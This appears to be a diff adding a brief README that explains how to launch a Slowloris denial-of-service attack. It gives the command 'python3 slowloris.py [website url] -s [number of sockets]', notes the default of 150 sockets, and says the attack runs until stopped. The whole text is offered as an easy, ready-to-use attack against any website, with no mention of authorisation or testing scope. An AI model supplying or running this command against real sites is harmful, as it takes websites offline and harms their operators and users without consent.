@@ -1,0 +1,11 @@
+DDOS Attack with Slowloris
+
+(Super Easy, literally two lines)
+
+cd slowloris
+
+python3 slowloris.py [website url] -s [number of sockets]
+
+Can leave out '-s' and '[number of sockets]' for default 150 sockets
+
+Attack will run until stopped
